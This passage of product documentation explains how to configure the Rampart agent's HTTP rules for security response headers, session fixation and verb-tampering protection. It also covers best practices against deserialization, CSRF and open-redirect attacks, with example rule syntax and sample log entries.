• Content-Security-Policy: enables another layer of security that helps to detect and mitigate certain types of attacks, including Clickjacking, Cross-Site Scripting (XSS) and data injection attacks.

When using the Rampart `http` rule to set custom HTTP/HTTPS response headers the user is advised to check that the web browser supports the inserted HTTP/HTTPS response header. Providing this is satisfied, the user is free to add any HTTP/HTTPS response header name and value. The agent never attempts to override existing application headers.

⚠️ HTTP/HTTPS response headers added by this rule may change the way the browser renders the application's web pages.

## **Given (Condition)**

The HTTP/HTTPS response header addition feature is enabled using the Rampart `http` rule. The following condition must be specified - `response`.

| response | This determines the HTTP endpoints to which custom headers are added to the responses. An optional Key-Value pair can be supplied to this declaration where the key is `paths` and the value can be one of the following: (indicating specifically targeted HTTP endpoints)
• a quoted string
• a list of one or more quoted-strings
If no value is specified then custom headers are applied to all HTTP endpoints by default. If a string value is specified then it must:
• not be empty
• be a valid relative URI |

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | This is the only available action for the Rampart HTTP/HTTPS Response Header Addition feature and in addition to the standard log message and severity parameters, must also be specified with the following parameter: `http-response: {set-header:                     {headerName: "headerValue"}}`, The `set-header` declaration can contain multiple headers providing each one has a unique header name. Each header is represented as a key-value pair where:
• the key is the header name
• the value is the header value, which can be one of the following:
	◦ string literal
	◦ integer
	◦ float
	◦ boolean |

## Examples

The following examples show, for each of the headers listed in the introduction, how the Rampart `http` rule can be used to add these to the HTTP/HTTPS response.

• The HTTP X-XSS-Protection response header is a feature of Internet Explorer, Chrome and Safari that stops pages from loading when they detect reflected cross-site scripting (XSS) attacks:

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {X-XSS-Protection: 1}}, message: "Setting custom header.", severity: High)
    endhttp

    endapp
    ```

A log entry similar to the following is generated when the above `http` rule successfully adds the specified header to an HTTP response:

    ```
    <10>1 2022-01-31T13:09:59.497Z userX_system java 19285 - - CEF:0|Rampart:Rampart|Rampart|2.10|Add custom headers to HTTP/S response|Execute Rule|High|msg=Setting custom header. rt=Jan 31 2022 13:09:59.496 +0000 appVersion=1 act=protect httpHeaderName=X-XSS-Protection dvchost=userX_system ruleType=http procid=19285 httpRequestUri=/spiracle/ httpRequestMethod=GET securityFeature=http set header internalHttpRequestUri=/spiracle/
    ```

The XSS rule can be employed in addition to using the X-XSS-Protection response header for multi-layered security, however, these rules have no dependency on each other and work completely separately in the security they provide. Please check MDN Web Docs “X-XSS-Protection” for more information.

• The X-Content-Type-Options response HTTP header is a marker used by the server to indicate that the MIME types advertised in the `Content-Type` headers should not be changed and be followed. This allows to opt-out of MIME type sniffing.

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {X-Content-Type-Options: "nosniff"}}, message: "Setting custom header.", severity: High)
    endhttp

    endapp
    ```

Please check MDN Web Docs “X-Content-Type-Options“ for more information about the response header.

• The X-Frame-Options HTTP response header can be used to indicate whether a browser should be allowed to render a page in a `<frame>`, `<iframe>`, `<embed>` or `<object>`. Applications and sites can use this to avoid Clickjacking attacks by ensuring that their content is not embedded into other sites. Note that the HTTP Content-Security-Policy response header can also be used to protect against Clickjacking. If you add the response header X-Frame-Options=DENY, pages cannot be displayed in frames, regardless of the site attempting to do so. Framing is disabled even when loaded from the same site.

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {X-Frame-Options: "DENY"}}, message: "Setting custom header.", severity: High)
    endhttp

    endapp
    ```

If you add the response header X-Frame-Options=SAMEORIGIN, framed pages can be used as long as the site including it in a frame is the same as the one serving the page:

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {X-Frame-Options: "SAMEORIGIN"}}, message: "Setting custom header.", severity: High)
    endhttp

    endapp
    ```

Τhe response header X-Frame-Options=ALLOW-FROM URI, is an obsolete directive that no longer works in modern browsers, so it is not recommended to use it. In supporting legacy browsers, a page can only be displayed in a frame on the specified origin URI. Note that in the legacy Firefox implementation, this still suffered from the same problem as SAMEORIGIN did — it doesn't check the frame-ancestors to see if they are in the same origin. The Content-Security-Policy HTTP header has a `frame-ancestors` directive which you can use instead.

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {X-Frame-Options: "ALLOW-FROM https://example.com/"}}, message: "Setting custom header.", severity: High)
    endhttp

    endapp
    ```

Please check MDN Web Docs “X-Frame-Option“ for more information about the X-Frame-Options response header.
Please check MDN Web Docs “Clickjacking Defense Cheat Sheet“ for more information on how to use HTTP response headers to protect against Clickjacking.

• The HTTP Content-Security-Policy response header allows users to control resources the browser is allowed to load for a given page. The `Content-Security-Policy` HTTP header is part of the HTML5 standard and provides a broader range of protection than the `X-Frame-Options` header. Users can whitelist individual domains from which resources can be loaded (such as scripts, stylesheets, and fonts), and also domains that are permitted to embed a page. The Content-Security-Policy response header and the frame-ancestors directive can also be used to control whether the site's content can be embedded or framed, effectively protecting against Clickjacking.

Using the response header `Content-Security-Policy=frame-ancestors 'none'` prevents any domain from framing the content. This setting is recommended unless a specific need has been identified for framing. Using `frame-ancestors 'none'` is similar to using `X-Frame-Options: deny`.

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {Content-Security-Policy: "frame-ancestors 'none'"}}, message: "Setting custom header.", severity: High)
    endhttp

    endapp
    ```

Using the response header `Content-Security-Policy=frame-ancestors 'self'` only allows the current site to frame the content. This setting is recommended if the application requires framing of its own pages. Using `frame-ancestors 'self'` is similar to using `X-Frame-Options: sameorigin.`

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {Content-Security-Policy: "frame-ancestors 'self'"}}, message: "Setting custom header.", severity: High)
    endhttp

    endapp
    ```

Using the response header `Content-Security-Policy=frame-ancestors 'self' URI1 URI2` allows the current site, as well as any page on the other trusted URIs to frame pages of this site. This setting is recommended if the application allows specific third-party applications or websites to frame its pages.

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {Content-Security-Policy: "frame-ancestors 'self' *.somesite.com https://trusted.site.com"}}, message: "Setting custom header.", severity: High)
    endhttp
    endapp
    ```

Please check MDN Web Docs “Contest Security Policy“ for more information about the Content-Security-Policy response header.

• The HTTP Strict-Transport-Security response header (often abbreviated as HSTS) lets a website tell browsers that it should only be accessed using HTTPS, instead of using HTTP:

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {Strict-Transport-Security: "max-age=31536000"}}, message: "Setting custom header.", severity: High)
    endhttp

    endapp
    ```

Please check MDN Web Docs “Strict Transport Security“ for more information about the Strict-Transport-Security response header.

• The Access-Control-Allow-Origin response header indicates whether the response can be shared with requesting code from the given origin.

    ```
    app("Header response addition mod"):
    requires(version: Rampart/2.10)

    http("Add custom headers to HTTP/S response"):
    response()
    protect(http-response: {set-header: {Access-Control-Allow-Origin: "*"}}, message: "Setting custom header.", severity: High)
    endhttp
    endapp
    ```

Please check MDN Web Docs “Access Control Allow Origin“ for more information about the Access-Control-Allow-Origin response header.

## **Session Fixation Security Feature**

## Overview

HTTP Session Fixation is an exploit that permits an attacker to hijack a valid user session. It is a common attack in web applications and Java frameworks. An application is vulnerable to session fixation attacks when:

- The web application authenticates a user without first invalidating the existing session, thereby reusing the same user session already associated with that user.
- An attacker is able to force a known session identifier on a user so that once the user authenticates, the attacker has access to the authenticated session.

It must be noted that:

• Session fixation is a subcategory of Session Hijacking attacks.
• The session fixation threat model assumes that the attacker has no session ID theft capabilities (for example, by means of a Man-In-The-Middle or an XSS attack).
    ◦ It is recommended that the Rampart XSS security feature is enabled together with the Rampart Session Fixation security feature.

ℹ️ Session fixation vulnerabilities are covered by CWE-384.

The Rampart Session Fixation security feature protects against session fixation attacks by regenerating the session ID when the user authenticates. This rule only supports applications whose Authentication Management system sets authentication and identity information on every HTTP request and, as such, does not regenerate the session ID of requests that do not carry such identity information.

💡

In the very rare case that the target web application depends on having the same HTTP session ID both before and after user authentication, then enabling this security rule may break normal application functionality.

## **Given (Condition)**

The Rampart Session Fixation security feature is enabled using the Rampart `http` rule. With this rule, the user can specify a single condition - `request`.

| request | This declaration allows the user to define a Rampart `http` rule that acts upon receiving a user request. |

## When (Event)

| authenticate | This condition allows the user to specify that the Rampart `http` rule should authenticate a user at login. The following parameter is supported: `user` |

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | This is the only available action for the Rampart Session Fixation security feature and, in addition to the standard log message and severity parameters, must also be specified with the following parameter: `http-session: regenerate-id` |

## **Example**

The following Rampart `http` rule switches on the Rampart Session Fixation security feature. The sessionID of a user of an application that is vulnerable to session fixation attacks is regenerated at login:

```
app("Session Fixation mod"):
  requires(version: Rampart/2.10)
  http("Enable protection from Session Fixation attacks"):
    request()
    authenticate(user)
    protect(http-session: regenerate-id, message: "HTTP Session ID regenerated", severity: 6)
  endhttp
endapp
```

### Logging

In general, all Rampart security features generate a log entry when the agent detects an attack. The Rampart Session Fixation security feature is different in that it provides pro-active protection, acting before an attack occurs. This removes the attack vector, preventing the possibility of performing a session fixation attack and therefore no log entry is generated.

## **HTTP Verb Tampering**

## Overview

HTTP verb tampering is an attack that exploits vulnerabilities in applications or servers that do not properly validate the verb (also known as the method) of HTTP requests. This can lead to authentication and access control bypass attacks. For example, some applications perform user authentication only for HTTP requests that use common HTTP methods/verbs such as POST and GET. It is therefore common to bypass this authentication by submitting such requests using a different HTTP method/verb type, therefore exploiting a vulnerability by means of HTTP verb tampering.

ℹ️ HTTP verb tampering vulnerabilities are covered by CWE-650 and CAPEC-274.

The HTTP Verb Tampering security feature is enabled using the Rampart `http` rule. When this security feature is enabled the agent monitors all HTTP requests that target the HTTP endpoints defined in the Rampart `http` rule and validates the HTTP request method according to the validation policy of the rule.

## **Given (Condition)**

To enable the HTTP Verb Tampering security feature using the Rampart `http` rule the user specifies the `request` declaration.

| request | This determines the HTTP endpoints for which protection is enabled. An optional Key-Value pair can be supplied to this declaration where the key is paths and the value can be one of the following (indicating specifically targeted HTTP endpoints) :- • a quoted string • a list of one or more quoted-strings If no value is specified then protection is applied to all HTTP endpoints by default. If a string value is specified then it must: • not be empty • be a valid relative URI |
| --- | --- |

## When (Event)

| validate | To enable HTTP verb tampering protection the user must provide the method parameter to this declaration. In addition, the key-value pair with key is must also be defined. |  |
| --- | --- | --- |
|  | method | The method key signifies that HTTP verb (method) tampering protection is in use |
|  | is | The is key indicates the permitted values of HTTP verbs for a given request. Possible values for the is key are: • GET • POST • HEAD • PUT • DELETE • CONNECT • OPTIONS • TRACE • PATCH |

## Then (Action)

| Action | Description |
| ------ | ----------- |
| protect | Processing of an HTTP request that fails method validation is stopped and the HTTP response returned is empty. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. A log message is generated with details of the HTTP request target that fails validation. A log message must be specified with this action. |
| allow | Can be used to allow HTTP requests of particular method types for specific HTTP endpoints while a more generic Rampart `http` rule, in `protect` mode say, disallows the same method types for a larger set of HTTP endpoints. |


## Examples

The following Rampart `http` rule switches on the HTTP Verb Tampering security feature to protect against HTTP/HTTPS requests that use an unexpected value for the HTTP verb (method). The verb tampering validation ensures that the HTTP method used for all requests is one of `GET` or `POST`:

```
app("HTTP Verb Tampering mod"):
  requires(version: Rampart/2.10)
  http("HTTP method tampering protection, all HTTP endpoints"):
    request()
    validate(method, is: [GET, POST])
    protect(message: "HTTP method/verb is not GET or POST", severity: Very-High)
  endhttp
endapp
```

A log entry similar to the following is generated when the above Rampart `http` rule identifies an unexpected value for the HTTP request method:

### Logging

```
<9>1 2021-03-30T17:43:54.538+01:00 userX_system java 32008 - - CEF:0|Rampart:Rampart|Rampart|2.10|HTTP method tampering protection, all HTTP endpoints|Execute Rule|Very-High|rt=Mar 30 2021 17:43:54.537 +0100 dvchost=userX_system procid=32008 appVersion=1 ruleType=http securityFeature=http input validation act=protect msg=HTTP method/verb is not GET or POST validationRule=OneOf:[GET, POST] value=DELETE httpRequestUri=/webapp/index.jsp httpRequestMethod=GET internalHttpRequestUri=/webapp/index.jsp remoteIpAddress=127.0.0.1 httpSessionId=3153E581A645E2A54D3C12D3928473BC httpCookies=JSESSIONID\=3153E581A645E2A54D3C12D3928473BC
```

## **Further Examples**

The following mod ensures the HTTP method is one of `GET`, `POST`, `PUT` or `DELETE`. This applies to the “index.jsp” page of the application only:

```
app("HTTP Verb Tampering mod 2"):
  requires(version: Rampart/2.10)
  http("HTTP method tampering protection, specific HTTP endpoint"):
    request(paths: "/webapp/index.jsp")
    validate(method, is: [GET, POST, PUT, DELETE])
    protect(message: "HTTP method/verb is not valid for index.jsp", severity: 8)
  endhttp
endapp
```

The following mod detects requests where the HTTP method is neither `GET` nor `POST`. This applies to the two pages of the application “testPageA.jsp“ and “testPageB.jsp“:

```
app("HTTP Verb Tampering mod 3"):
  requires(version: Rampart/2.10)
  http("HTTP method tampering protection, multiple HTTP endpoints"):
    request(paths: ["/webapp/testPageA.jsp", "/webapp/testPageB.jsp"])
    validate(method, is: [GET, POST])
    detect(message: "HTTP method/verb is not GET or POST for either test page", severity: Very-High)
  endhttp
endapp
```

# **Security Features Best Practices**

The Rampart platform offers a number of security features that provide detection, protection and remediation of application vulnerabilities and attacks.This section offers information about the vulnerabilities that the Rampart security features protect against, and best practices regarding rule deployment in production environments.

## **Best Practices - Unsafe Deserialization of Untrusted Data**

### Vulnerability Overview

Deserialization of untrusted data (CWE-502) occurs when applications deserialize data from untrusted sources without sufficiently verifying that the incoming data is valid and therefore the in-memory object is safe to use. Since this vulnerability can lead to a complete compromise of a vulnerable system, it is considered to be one of the most damaging types of attacks. To make matters worse, deserialization attacks have become one of the most widespread security vulnerabilities to occur over the past few years.

Serialization is the process of converting an object in memory into a stream of bytes in order to store it in the filesystem or transfer it to another remote application. Deserialization is the reverse process that converts the serialized stream of bytes back to an object in memory. All main programming languages, such as Java and .NET, provide facilities to perform native serialization and deserialization and most are vulnerable. Deserialization vulnerabilities are not limited to language deserialization APIs but also encompass libraries that make use of other serialization formats such as XML and JSON.

How the attack works can be summarized in the following steps:

1. A vulnerable application accepts user-supplied serialized objects.
2. An attacker performs the attack by:
    a. creating a malicious gadget chain (sequence of method calls)
    b. serializing it into a stream of bytes using the serialization API
    c. sending it to the application
3. Deserialization occurs when the vulnerable application reads the received stream of bytes and tries to construct the object.
4. When a malicious object gets deserialized, the gadget chain is executed and the system is compromised.

### Recommended Security Controls

According to the CERT​ and MITRE​ recommendations, to be protected against Deserialization attacks, applications must:

- Minimize privileges before deserializing from a privileged context.
- Not invoke potentially dangerous operations during deserialization.

Additionally, ​OWASP​ states the following:
- Malformed data or unexpected data could be used to abuse application logic.
- Malicious objects can abuse the logic of custom deserializers in order to affect code execution.

### How Rampart’s Protection Works

In accordance with the CERT, MITRE and OWASP recommendations and observations, Rampart protects against deserialization attacks (CWE-502) by addressing the problem from a privilege escalation (CWE-250) and an API abuse (CWE-227) point of view.

The task of deserialization is to convert a stream of bytes into an object in memory. The runtime platform (e.g. JVM) should allow this conversion but should not allow more privileged operations that are outside of the scope of the object deserialization API. Deserialization attacks depend on invoking API methods that are considered to be privileged, such as `java.lang.Runtime.exec()`, in order to perform an attack. The goal of the deserialization attack is to create a gadget chain that reaches and executes these privileged platform functions and executes the payload on the system. The payload could abuse the filesystem, the operating system or system resources.

On specific object deserialization operations (called boundaries), the Rampart agent constructs a dynamic restricted micro-compartment on the execution thread and continues the object deserialization inside it. Rampart de-escalates the privileged operations in the micro-compartment and monitors the usage of resources. If a privileged function is invoked inside the micro-compartment, the execution is terminated and the payload is not executed. The same logic applies for Denial-of-Service attacks; if resources are abused inside the micro-compartment, then the deserialization process is terminated and the attack is prevented before the system resources are exhausted. The micro-compartment is destroyed on a non-malicious object deserialization completion and privilege de-escalation is revoked on the executing thread. The Rampart protection supports popular deserialization APIs and formats that can be used across the application. Additionally, the Rampart agent is able to protect against attacks regardless of the untrusted source e.g. when the serialized data is coming from an HTTP client (such as an external web request) or data coming from another internal system (such as a message queue).

The privilege de-escalation micro-compartment offers protection against deserialization attacks without depending on white or black listing known dangerous classes used by publicly available gadget chains and exploits. This allows users to deploy new versions of their applications without having to profile their application’s new functionality and adjust the white/black lists accordingly. Rampart offers protection against Deserialization attacks via the `deserial` declaration in the Rampart Marshal rule. Currently, there are 2 deserial rules:

1. The `rce()` rule, which protects against Remote Code Execution (RCE) deserialization attacks
2. The `dos()` rule, which protects against Denial-of-Service (DoS) deserialization attacks

Enabling these rules sets up the privilege de-escalation runtime micro-compartmentalization framework that monitors and controls memory allocation, CPU utilization, circular dependency depths, code injection, and privilege escalation during deserialization operations.

### Protective Action

When the deserial rule is enabled in protect mode and a deserialization attack is identified then the malicious deserialization operation is terminated and a Java exception is thrown back to the application, in accordance with the deserialization API.

### Rule Applicability

The deserial rules can be safely enabled in all types of applications in order to be protected against Java and XML deserialization attacks. Note that JSON deserialization vulnerabilities are not currently supported. XML deserialization vulnerabilities can be introduced by different XML APIs and libraries. Currently, the only XML API that is supported is `java.beans.XMLDecoder`.

It is advisable for the rules to be enabled even if the application does not explicitly perform deserialization operations. This is because deserialization can occur anywhere in the Java stack e.g. in WebLogic, Struts, Spring, Log4j, etc.

The deserial rules do not require any configuration overall. In very rare occasions, privileges restricted by the deserialization micro-compartment might be required by the protected application. In such cases, the `AllowDeserialPrivileges` property must be used to fine-tune the micro-compartment to allow the given privilege.

For example:

`Rampart.AllowDeserialPrivileges=java.lang.SecurityManager.<init>(),java.lang.System.getenv()`

### Best Practices

Due to the criticality of the vulnerability and because users typically are unaware if there are components anywhere in their Java stack, it is recommended to enable both deserial rules in order to be protected against RCE and DoS deserialization attacks.

### References

- https://cwe.mitre.org/data/definitions/502.html
- https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
- https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88487787

## **Best Practices - Cross-Site Request Forgery**

### Vulnerability Overview

Cross-Site Request Forgery or CSRF (CWE-352) is an attack that occurs when the web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent HTTP request was intentionally provided by the user who submitted the request.

A CSRF attack works because browser requests automatically include all cookies, including session cookies. Therefore, if the user is authenticated to the site, the site cannot distinguish between legitimate requests and forged requests.

The flaw occurs when the application does not have any mechanism to distinguish between legitimate requests and forged requests.

### Recommended Security Controls

According to the OWASP​ and ​MITRE​ recommendations, there are a few approaches to mitigate CSRF attacks. Each of these approaches is suitable for specific types of web applications.

The most commonly used and recommended solution is via the Synchronizer Token Pattern. Using this security control, CSRF tokens are generated on the server side. They can be generated once per user session or for each request. Per-request tokens are more secure than per-session tokens as the time range for an attacker to exploit the stolen tokens is minimal. However this may result in usability concerns. For example, the "Back" button browser capability is often hindered as the previous page may contain a token that is no longer valid. Interaction with this previous page results in a CSRF false positive security event at the server. In per-session token implementation after initial generation of a token, the value is stored in the session and is used for each subsequent request until the session expires.

When an HTTP request is issued by the client, the server-side component must verify the existence and validity of the token in the request compared to the token found in the user session. If the token was not found within the request or the value provided does not match the value within the user session, then the request should be aborted, the user session terminated and the event logged as a potential CSRF attack in progress.

CSRF tokens prevent CSRF attacks because without knowing the correct CSRF token, attackers cannot create valid HTTP requests to the backend server.

Another security control is the validation of the HTTP request’s origin via standard HTTP request headers​. There are two steps to this mitigation, both of which rely on examining an HTTP request header value:

1. Determining the origin the request is coming from (source origin) which can be achieved via Origin or Referer headers.
2. Determining the origin the request is going to (target origin).

On the server-side, if both are verified as matching, the request is accepted as legitimate (meaning it's the same origin request) and if not we discard the request (meaning that the request originated from cross-domain). Such headers are deemed reliable and trustworthy as they cannot be altered programmatically (using JavaScript with an XSS vulnerability) since they fall under the forbidden headers list, meaning that only the browser can set them.

### How Rampart’s Protection Works

Rampart offers protection against CSRF attacks via 2 different features in the Rampart http rule:

1. csrf(synchronized-tokens)
2. csrf(same-origin)

Users can enable either one of these features or both. OWASP recommends using both security controls, however, not all application environments are applicable for both types of security controls.

### The CSRF Synchronizer Token Pattern (STP) rule

At a high-level, the CSRF STP rule stops the processing of the JSP/Servlet if the received HTTP request is missing or carries an incorrect CSRF token.

The CSRF STP rule enables the Synchronizer Token Pattern protection, which instructs Rampart to inject CSRF tokens in specific HTML elements. The HTML elements covered are:

- `<form>` elements in which the token is injected as a hidden input field.
- `<a>` elements in which the token is injected in the URL specified by its href attribute.
- `<frame>` and `<iframe>` elements in which the token is injected in the URL specified by their src attributes.

Enabling the default CSRF STP rule ensures all HTTP POST requests are protected by validating the CSRF token present in the requests. HTTP POST requests are the most important types of requests to protect because they are typically state-changing, whereas HTTP GET requests are typically not.

Using the configuration of this rule, users have the option to:
• Enable protection for HTTP GET requests
    ◦ By default only HTTP POST requests are protected. If protection for HTTP GET requests is also required, use the `method` option: `csrf(synchronized-tokens, options: {method: [GET, POST]})`.
• Exclude / whitelist specific HTTP endpoints from protection
    ◦ By default all HTTP endpoints are protected. If protection for specific HTTP endpoints must be disabled use the `exclude` option: `csrf(synchronized-tokens, options: {exclude: ["/myApplication/safe.jsp"]})`.
• Exclude AJAX requests from protection
    ◦ AJAX requests are not supported by the CSRF STP rule because the CSRF token is not injected into client-side Javascript code that generates dynamic requests such as AJAX. AJAX requests typically carry the X-Requested-With header. If the application uses AJAX requests, the `ajax` option can be used to disable validation for these requests: `csrf(synchronized-tokens, options: {ajax: no-validate})`.
• Use a different CSRF token for each HTTP method (POST / GET)
    ◦ By default one CSRF token is used for POST requests and a different CSRF token is used for GET requests. The benefit of this is to protect the CSRF token for POST requests in case the CSRF token for GET requests gets leaked. The `token-type` option can be used to disable this and use a single token across both POST and GET requests instead: `csrf(synchronized-tokens, options: {method: [GET, POST], token-type: shared})`.
• Rename the CSRF token used in the HTTP requests
    ◦ By default the name of the CSRF token used by Rampart is “_X-CSRF-TOKEN”. In the rare case where this name is used by a different HTTP parameter, then use the `token-name` option to rename the HTTP parameter that Rampart uses to carry the CSRF token: `csrf(synchronized-tokens, options: {token-name: "custom-name"})`.
### The CSRF Same-Origins Rampart rule

At a high-level, the CSRF Same-Origins rule checks if the received HTTP request is coming from a source origin different from the target origin. The source origin is determined by the Origin, Referer, or​ X-Forwarded-For headers. The target origin is determined by the Host or X-Forwarded-Host headers or by the hosts configured in the Rampart rule.

If the origin validation fails then the rule strips out all HTTP parameters, cookies and payloads from the HTTP request, rendering it harmless. If none of the Origin headers are present, the origin validation cannot be performed and the rule blocks the HTTP request, according to the OWASP recommendations. When enabling the default CSRF Same-Origins rule then all HTTP POST requests are protected by validating the standard Origin HTTP response headers that should be present in the requests. The following is an example of the default CSRF Same-Origins rule:

```
app("CSRF Same-Origins"):
requires(version: Rampart/2.10)
http("Deny HTTP requests with invalid origin header (for all HTTP endpoints)"):
csrf(same-origin)
request()
protect(message: "HTTP origin validation failed", severity: 7)
endhttp
endapp
```

If protection is needed for specific HTTP endpoints, the specific relative URIs of the HTTP endpoints must be supplied in the `request` declaration of the CSRF Rampart rule.

For example:

```
app("CSRF Same-Origins"):
requires(version: Rampart/2.10)
http("Deny HTTP requests with invalid origin header (for specific HTTP endpoints)"):
csrf(same-origin)
request(paths: ["/path/to/vulnerablePage.jsp", "/path/to/vulnerableServlet"])
protect(message: "HTTP origin validation failed", severity: 7)
endhttp
endapp
```

### Protective Action

When the CSRF STP rule is enabled in protect mode and a CSRF attack is identified then the malicious HTTP request is terminated and an HTTP 403 response is returned to the client.

When the CSRF Same-Origins rule is enabled in protect mode and a CSRF attack is identified then the malicious HTTP request is not terminated but all its HTTP parameters and cookies are considered malicious and are therefore stripped from the request, rendering it safe.

### Rule Applicability

### The CSRF Synchronizer Token Pattern (STP) rule

The CSRF STP rule is applicable and can be safely enabled in the following cases:

- In traditional web applications where the HTTP response of the application is an HTML page.
- In web applications that use the Servlet API to handle HTTP requests, responses and session management.
- In web applications that require CSRF protection for pages and resources accessible via GET and POST HTTP methods only. For instance `<form>` tags that trigger PUT requests are not supported.
- Where the srcdoc attribute present in `<iframe>` HTML elements is not protected against CSRF attacks.

Note that CSRF attacks are only meaningful when there is an HTTP session associated with the HTTP requests. Therefore, stateless applications, such as some RESTful APIs and unauthenticated HTTP requests that contain no valid HTTP session ID are not protected via the CSRF STP rule.

By default, only POST HTTP requests are validated by the CSRF STP rule, if no method is configured in the rule. Users have the option to configure the CSRF STP rule to also enable protection for GET HTTP requests.

Users should not enable the CSRF STP rule if the web application:

- Does not produce HTML responses via the Servlet API. Examples of such applications are RESTful API and XML-based Web Services.
- Does not use the standard J2EE Servlet APIs:
    a. javax.servlet.http.HttpServletRequest
    b. javax.servlet.http.HttpServletResponse
    c. javax.servlet.http.HttpSession

Enabling the CSRF STP rule in these cases could cause Rampart to either provide no protection or break the normal application functionality.

### The CSRF Same-Origins rule

The CSRF Same-Origins rule depends on the presence of the Origin or Referer headers in the HTTP requests. Although these headers are included in the HTTP requests the majority of the time, there are a few use cases where they are not included. The following lists the main use cases:

- Older browsers do not support the Origin header.
- Internet Explorer 11 does not add the Origin header on a ​CORS​ request across sites of a trusted zone.
- HTTP requests that occur after 302 redirect cross-origin requests do not include the Origin header.
- Load balancers, proxies and embedded network devices are well known to strip or change the Referer or the Origin headers.
- Browsers typically do not include the Origin header in bookmarked links.

In the case of applications where the source origin does not match the target origin even in non-malicious requests, the `hosts` rule parameter can be used to whitelist known safe origins.

For example:

```
app("CSRF Same-Origins"):
requires(version: Rampart/2.10)
http("Deny HTTP requests with invalid origin header (with whitelisted hosts)"):
csrf(same-origin, options: {hosts: ["account.example.org", "login.example.com"]})
request()
protect(message: "HTTP origin validation failed", severity: 7)
endhttp
endapp
```

Only POST HTTP requests are validated by the CSRF Same-Origins Rampart rule.

### Best Practices

It is recommended to also enable the XSS security rule in blocking mode to be protected against XSS attacks. If the application is vulnerable to XSS attacks then stealing the CSRF tokens would be possible via XSS attacks. This would allow attackers to bypass the CSRF protection.

Due to the fact that the CSRF STP rule might require some configuration, users are advised to first enable the CSRF Same-Origins rule as the first layer of defense against CSRF. Then consider enabling the CSRF STP rule only in relevant applications first in monitoring / detect mode and later in blocking mode after the rule has been properly configured.

Given that the CSRF Same-Origins rule depends on the presence of the Origin HTTP header, it is recommended that the CSRF Same-Origins rule is enabled only after ensuring all users are on an up-to-date browser version.

It is also recommended that users enable the CSRF Same-Origins rule only for the vulnerable HTTP endpoints reported by their vulnerability scanners.

### References

- https://owasp.org/www-community/attacks/csrf
- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- https://cwe.mitre.org/data/definitions/352.html

## **Best Practices - Open Redirect**

### Vulnerability Overview

Open Redirect (CWE-601) is a vulnerability that occurs when a user-controlled input is used to construct a link to an external site and the application uses that link in an HTTP redirect. This simplifies phishing attacks.

The flaw commonly occurs when the application sets the Location HTTP response header with an unsafe value from the HTTP request. In other words, the HTTP redirect URI can be controlled by the attacker.

### Recommended Security Controls

According to the OWASP​ and ​MITRE​ recommendations, to be protected against Open Redirect, applications must:

1. Assume all input is malicious. Use an "accept known good" input validation strategy, i.e. use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
2. If user input cannot be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.

The most common scenario of an open redirect attack is when the attacker redirects the user to an external, malicious, domain.

### How Rampart’s Protection Works

Rampart offers protection against Open Redirect attacks via the `redirect` declaration in the Rampart HTTP rule. This rule uses the tainting engine to track all user input, hooks into the Servlet API and monitors server-side HTTP redirect operations. When an HTTP redirect operation occurs, the Rampart agent deems the redirect unsafe if both the location URI is user-controllable (tainted) and if it is external to the application's domain. Tainted redirect locations to external root domains are not allowed. The rule detects or protects against HTTP server-side redirects to an external root domain, different subdomain or IP address from the application's.

For example, if the `redirect` rule is enabled and assuming that the application is hosted on the domain “www.example.com” then user-controlled server-side HTTP redirects to the following domains are deemed malicious and blocked: “www.google.com” , “www.example.co.uk” , “test.example.com”, “test1.test2.example.com”.

If the application depends on user-controlled HTTP redirects to different subdomains of the same root domain, then the `open-redirect(options: {exclude: subdomains})` option must be configured in the rule. Only user-controlled HTTP redirects to different root domains are considered malicious by the rule.

For example, if the `exclude=subdomains` option is enabled, and assuming that the application is hosted on the domain “www.example.com”, then user-controlled server-side HTTP redirects to the following domains are deemed malicious and blocked: “www.google.com”, “www.example.co.uk”. Note that user-controlled server-side HTTP redirects to the following domains are deemed safe and allowed: “test.example.com”, “test1.test2.example.com”.

By default, when no taint source is specified in the rule, the open redirect rule protects against attacks coming from HTTP requests. Users have the option to also enable protection against open redirect attacks coming from other sources such as relational databases and/or deserialization-based protocols such as RMI.

### Protective Action

When the Open Redirect rule is enabled in protect mode and an Open Redirect attack is identified then the malicious HTTP redirect operation is terminated.

### Rule Applicability

The Open Redirect rule is applicable and can be safely enabled for web applications that:

- Use the Servlet API to handle HTTP requests and responses.
- Perform server-side HTTP redirects to URLs of the same domain or a subdomain of the application’s root domain.

Applications that by design allow users to set the redirect location to external root domains are not supported by the Open Redirect rule.

The Open Redirect rule does not protect against client-side open redirect vulnerabilities, such as the those performed on the browser by Javascript.

### Best Practices

